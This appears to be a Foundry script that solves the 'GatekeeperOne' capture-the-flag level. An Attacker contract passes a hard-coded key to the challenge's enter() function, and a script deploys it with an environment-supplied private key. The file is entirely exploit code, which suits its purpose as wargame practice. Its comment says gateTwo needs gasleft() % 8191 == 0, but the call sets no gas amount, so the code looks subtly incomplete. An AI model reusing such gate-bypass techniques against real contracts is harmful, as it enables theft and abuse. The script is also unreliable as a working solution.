// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { GatekeeperOne } from "../src/13_GatekeeperOne.sol";

contract Attacker {

  GatekeeperOne challenge;

  constructor(address challengeInstanceAddress) {
    challenge = GatekeeperOne(challengeInstanceAddress);
  }

  function attack() external {
    // gateOne = send the tx from another contract
    // gateTwo = gasleft() % 8191 == 0
    // gateThree = uint16(uint160(tx.origin)) as a bytes8 (hex) with the first byte as a 10 instead of 00 to overflow the unint32 and uint16.
    challenge.enter(0x100000000000CDF1);
  }

}

contract GatekeeperOneAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("GatekeeperOne"));

    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    attacker.attack();

    vm.stopBroadcast();
  }

}